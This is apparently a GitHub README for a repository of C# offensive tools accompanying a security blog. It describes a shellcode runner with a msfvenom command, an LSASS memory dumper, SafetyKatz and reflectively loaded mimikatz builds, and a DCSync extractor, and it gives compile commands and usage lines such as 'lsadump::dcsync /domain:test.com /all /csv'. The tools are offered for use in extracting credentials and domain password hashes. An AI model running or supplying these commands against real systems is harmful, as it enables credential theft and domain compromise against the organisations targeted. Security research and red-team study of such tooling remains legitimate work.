# Homework-of-C-Sharp
C Sharp codes of my blog.

---

### Shellcode.cs

Use CreateThread to run shellcode.

### ShellcodeBase64.txt

Base64 of the shellcode(msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp)

### ReadShellcode.cs

It will read ShellcodeBase64.txt and launch the shellcode.

---

### DumpLsass.cs

Source code is https://github.com/GhostPack/SafetyKatz

Remove some functions of the source code,only used of dumping lsass.exe to the current path.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe DumpLsass.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe DumpLsass.cs`


### SafetyKatz.cs

Use to run `sekurlsa::logonpasswords` and `sekurlsa::ekeys` on the minidump file of lsass.exe.

All code from https://github.com/GhostPack/SafetyKatz

I just modified a few lines of code so that it can be compiled by csc.exe.

Eg.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SafetyKatz.cs /unsafe`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe SafetyKatz.cs /unsafe`

---

### GzipandBase64.cs

Use to generate the KatzCompressed string in PELoaderofMimikatz.cs

Complie:

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe GzipandBase64.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe GzipandBase64.cs`

### PELoaderofMimikatz.cs

The source file is Casey Smith's PELoader.cs and the version of mimikatz is mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48).

I change it to the new version(mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14).

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe PELoaderofMimikatz.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe PELoaderofMimikatz.cs`

### DcsyncofMimikatz.cs

This is the dcsync mode extracted from Mimikatz.

The source code in KatzCompressed is https://github.com/3gstudent/test/blob/master/Mimkatz-dcsync.zip

You can use https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/GzipandBase64.cs to generate the KatzCompressed string.

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe DcsyncofMimikatz.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe DcsyncofMimikatz.cs`

Usage:

`DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /all /csv" exit`

`DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /user:administrator /csv" exit`

---

### SharpMimikatz_x86.cs

Reference:Casey Smith's PELoader.cs

The source file is Casey Smith's PELoader.cs and the version of mimikatz is mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48).

I change it to the new version(mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14).

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

This is a 32-bit version.

Complie:

`C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 SharpMimikatz_x86.cs`

or

`C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /unsafe /platform:x86 SharpMimikatz_x86.cs`

Usage:

`SharpMimikatz_x86.exe coffee exit`

### SharpMimikatz_x64.cs

Reference:Casey Smith's PELoader.cs

The source file is Casey Smith's PELoader.cs and the version of mimikatz is mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48).

I change it to the new version(mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14).

The source code supprot 4.0 or later.

This code supprot 3.5 or later.

This is a 64-bit version.

Complie:

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 SharpMimikatz_x64.cs`

or

`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe /platform:x64 SharpMimikatz_x64.cs`

Usage:

`SharpMimikatz_x64.exe coffee exit`

---



